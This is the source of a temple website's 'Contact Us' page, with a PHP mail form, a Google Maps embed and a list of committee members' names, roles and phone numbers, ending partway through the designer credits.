<?php
$status = "";
$to = "universekannan@gmail.com";
if(isset($_POST['submit']))
{
	$name = $_POST['name'];
	$phone = $_POST['phone'];
	$email = $_POST['email'];
	$address = $_POST['address'];
	$feedback = $_POST['feedback'];
	
	if(empty($name) || empty($phone) || empty($email) || empty($address) || empty($feedback))
	{
		$status = '<div class="alert alert-danger">
  <strong>Error!</strong> Please fill required fields
</div>';
	}
	if(empty($status))
	{
		 $subject = "Arulmigu Yoga Parameswarar";
         $message  = "\n Name: ".$name."\r\n";
         $message .= "\n Phone: ".$phone."\r\n";
		 $message .= "\n Email: ".$email."\r\n";
		 $message .= "\n Address: ".$address."\r\n";
		 $message .= "\n Feedback: ".$feedback."\r\n";
         
         $header = "From:universekannan@gmail.com \r\n";
         $header .= "Cc:universekannan@gmail.com \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         
         $retval = mail ($to,$subject,$message,$header);
         
         if( $retval == true ) {
            $status = '<div class="alert alert-success">
  <strong>Success!</strong> Email sent successfully
</div>';
         }else {
            $status = '<div class="alert alert-danger">
  <strong>Error!</strong> Failed to send message.
</div>';
         }
		 
	}
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title> Contact Us Arulmigu Yoga Parameswarar Temple|Temple in Mottavilai</title>
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
        <meta name="description" content="Arulmigu Yoga Parameswarar Temple  | Arulmigu Yoga Parameswarar Temple  Website - A Best Parameswarar Temple In India" />
		<meta name="Keywords" content="Arulmigu Yoga Parameswarar Temple  | Arulmigu Yoga Parameswarar Temple  Website - A Best Parameswarar Temple In India<" />
		<meta name="author" content="Galaxy Kannan" />
	    <meta name="copyright" content="Galaxy Technology Park Pvt Ltd" />	
	    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
    <!-- Bootstrap Core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="css/custom.css" rel="stylesheet">
    <link href="css/homebanner.css" rel="stylesheet">
    <link href="css/screens.css" rel="stylesheet">

    <noscript>
        <link rel="stylesheet" type="text/css" href="css/nojs.css"/>
    </noscript>

    <!-- Custom Fonts -->
    <link href="css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <script src="js/html5shiv.js"></script>
    <script src="js/respond.js"></script>
     <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]--> <style>
        table {
            font-family: arial, sans-serif;
            border-collapse: collapse;
            width: 100%;
        }
        td{
            border: 1px solid #dddddd;
            text-align: left;
            padding: 8px;

        }

        th {
            border: 1px solid #dddddd;
            background-color: #58C7DD;
            text-align: left;
            padding: 8px;
        }

        tr:nth-child(even) {
            background-color: #dddddd;
        }
    </style>

</head>

<body>
<!-- Top Section -->
<script language="javascript" type="text/javascript">


    function formHandler(form) {
        var URL = document.form1.year.options[document.form1.year.selectedIndex].value;
        window.location.href = URL;
    }
    // End -->
</script>
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
			<?php include("header.php"); ?>

<!-- Navigation Section-->
			<?php include("menu.php"); ?>
	<!-- Shopping Profile Section -->
	<br/>
	<br/>
	<div class="container homeMainContent">
	<div class="section">
			<div class="container">
<b><h1 align="center" style="font-family">Contact Us</h></b>
                  <br />
				 </div></div> 
				  
	 <section class="subPageMainContainer">
		<div class="container">
			<div class="row">
				<div class="col-md-5">
				
				<?php echo $status; ?>
				
					<div class="subPageLeft">
						<div class="subPageMainCont">
							<form class="cmxform form-horizontal" id="postEnquiry" method="post" action="contactus.php">
							<div class="col-md-12">
								<div class="form-group">
									<label class="control-label col-md-3 prayerReqLbl" for="name">Name</label>
									<div class="col-md-9"><input type="text" class="form-control input-sm" name="name" id="name" required="required" placeholder=""></div>
								</div>
								<div class="form-group">
									<label class="control-label col-md-3 prayerReqLbl" for="phone">Telephone</label>
									<div class="col-md-9"><input type="text" class="form-control input-sm" name="phone" id="phone" required="required" placeholder=""></div>
								</div>						
								<div class="form-group">
									<label class="control-label col-md-3 prayerReqLbl" for="email">E-Mail</label>
									<div class="col-md-9"><input type="text" class="form-control input-sm" name="email" id="email" required="required" placeholder=""></div>
								</div>
								<div class="form-group">
									<label class="control-label col-md-3 prayerReqLbl" for="address">Address</label>
									<div class="col-md-9"><textarea class="form-control" rows="3" name="address" id="address" required="required"></textarea></div>
								</div>
			
								<div class="form-group">
									<label class="control-label col-md-3 prayerReqLbl" for="feedbackFeed">Feedback</label>
									<div class="col-md-9"><textarea class="form-control" rows="5" name="feedback" id="feedback" required="required"></textarea></div>
								</div>
								
								<div class="form-group">
									<div class="col-md-12">
									 <center> <button type="submit" name="submit" class="btn btn-primary">Submit</button></center>
									</div>
								</div>
							</div>
							</form>
							<!-- Go to www.addthis.com/dashboard to customize your tools -->
							<div class="addthis_responsive_sharing"></div>
						</div>
					
					</div>
				</div>

				<div class="col-md-6">
					<div class="subPageLeft">
						
						<div class="subPageMainCont contactMap"><div class="google-maps">
						
						<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3948.9717854113464!2d77.33716521478085!3d8.205591494094653!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3b04f984b5d79a07%3A0xda482a83317ef58a!2sYoga+Parameswarar+Temple!5e0!3m2!1sen!2sin!4v1493479807441" width="600" height="450" frameborder="0" style="border:0" allowfullscreen></iframe>
					</div></div>
					</div>
					
				</div>
				
			</div>
		</div>
    </section>
	
<section id="get-in-touch">
        <div class="container">
		<div class="section-header">
                <h2 class="section-title text-center wow fadeInDown">Contact Team</h2>
               <br />
            </div>
										<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/chellathurai.jpg" alt="">
                        </div>
                        <div class="team-info">
                         <h4>T.Chellathurai</h4>
                            <span>President</span><br />
                            <span>8903211538</span><br />

							<p>
						  
						   </p>
						   <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                            <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                             <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
					 	
                              <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                        
                    </div>
                </div>
							<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <h4>T. Manogaran</h4>
                            <span>Vice President</span><br />
                            <span>9443587282</span><br />
							<p>
						   </p>
						   
							<a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                             <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                             <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
						
                             <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                        
                    </div>
                </div>
											<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                          <h4>V. Rajasundaram </h4>
                            <span>Vice President</span><br />
                            <span>9442831255</span><br />
							<p>
						   
						   </p>
						   <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                            <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                             <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
					 	
                              <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                        
                    </div>
                </div>
							<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <h4>S. Kannan</h4>
                            <span>Secretary</span><br />
                            <span>9500696123</span><br />
							<p>
						   </p>
						   
							<a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                             <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                             <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
						
                             <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                        
                    </div>
                </div>
				 <br />

			<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>C. Manikandan</span><br />
                            <span>Vice Secretary</span><br />
							<span>9042126463</span>
                        </div>
                        <p>
						</p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
						
                       <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
					    <p>
						</p>
                    </div>
                </div>
                			<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>N. Manikadal</span><br />
                            <span>Vice Secretary</span><br />
                           <span>9442831255</span>
						   <p>
						   
						   </p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
						
                       <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                        
                    </div>
                </div>
							<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                          <span>S. Suresh</span><br />
                            <span>Vice Secretary</span><br />
                            <span>7598556766</span>
							<p>
						   
						   </p>
						   <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                            <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                             <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
					 	
                              <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                        
                    </div>
                </div>
							<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
						  <span>P. Vaikundamani</span><br />
                          <span>Vice Secretary</span><br />
						  <span>9443587282</span>
							<p>
						 
						   </p>
						   
							<a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                             <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                             <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
						
                             <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                        
                    </div>
                </div>
                </div>
    </section>
	<br/>
	<section id="get-in-touch">
        <div class="container">
            
			<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>T Kannan</span><br />
                            <span>Treasurer</span><br />
							<span>9443587282</span>
                        </div>
                        <p>    </p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
						
                       <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                    </div>
                </div>
                <div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/galaxy-kannan.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>Galaxy Kannan</span><br />
                            <span>Executive member</span><br />
                           <span>9344332244</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div><div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>B. Ajiesh</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>D. Vinoth Kumar</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>V. Jaya Ramesh</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>T. Nadarajan</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>M. Murugan</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>T. Senthil Kumar</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>T.Raja</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>C. Thangavel</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>T. Raja Mani</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>R. Rajan</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>M. Neelakandan</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>A. Siva Linkam</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>R. Gopi Kumar</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>T. Thiraviam</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>R. Vijian</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>S. Ajith</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>B. Nishanth</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/main.jpg" alt="">
                        </div>
                        <div class="team-info">
                           <span>S.Kumar</span><br />
                            <span>Executive member</span><br />
                           <span>9442831255</span>
						   <p></p>
                        <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                        <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                        <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
			<a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                      </div>
                </div><hr>
				            <div class="section-header">
                <h2 class="section-title text-center wow fadeInDown">Web Designer </h2>
               <br />
            </div>
										<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/galaxy-kannan.jpg" alt="">
                        </div>
                        <div class="team-info">
						 <h4>Galaxy Kannan</h4>
                            <span>Web Designer</span><br />
                            <span>9443587282</span>
							<p>
						    Galaxy Technology Park Pvt Ltd 
						   </p>
                          
						   <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                            <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                             <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
					 	
                              <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                        
                    </div>
                </div>
							
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/galaxy-kannan.jpg" alt="">
                        </div>
                        <div class="team-info">
						 <h4>Galaxy Kannan</h4>
                            <span>Web Designer</span><br />
                            <span>9443587282</span>
							<p>
						    Galaxy Technology Park Pvt Ltd 
						   </p>
                          
						   <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                            <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                             <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
					 	
                              <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                        
                    </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
                        <div class="team-img">
                            <img class="img-responsive" src="images/galaxy-kannan.jpg" alt="">
                        </div>
                        <div class="team-info">
						 <h4>Galaxy Kannan</h4>
                            <span>Web Designer</span><br />
                            <span>9443587282</span>
							<p>
						    Galaxy Technology Park Pvt Ltd 
						   </p>
                          
						   <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                            <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                             <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
					 	
                              <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                        
                    </div>
                </div>
<div class="col-sm-6 col-md-3">
                    <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">
